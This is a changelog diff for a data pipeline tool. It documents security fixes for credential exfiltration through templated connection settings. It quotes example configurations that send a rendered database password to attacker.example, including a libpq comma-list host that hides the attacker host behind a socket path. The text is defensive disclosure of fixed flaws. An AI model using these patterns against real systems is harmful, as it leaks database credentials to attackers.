@@ -252,7 +252,10 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
   builds).** `connection: {host: attacker.example, password: "{{ env.DB_PW }}"}` rendered the
   password and sent it to attacker.example, and a variable's name cannot tell `DB_PW`, `PGPASS` or
   `DATABASE_URL` from a harmless one. Each variable now renders only for the endpoints of its
-  block that the operator paired it with (see Changed).
+  block that the operator paired it with (see Changed). A `host` that is a comma list is judged by
+  its hosts: libpq reads `/sockdir,attacker.example` as a socket directory and then a TCP host that
+  gets the password (DuckDB's postgres `ATTACH`, Meltano's tap-postgres, Airbyte), and a path in one
+  element no longer hides the host in another. A value is a path only when every element is.
 - **A host variable that only a project's dotenv file sets is no longer the operator's choice
   (acquisition builds).** `fluid apply` loads the project's `.env`, `.env.<env>` and `.env.local`
   before it renders anything, and those files may set any name the credential policy does not list.
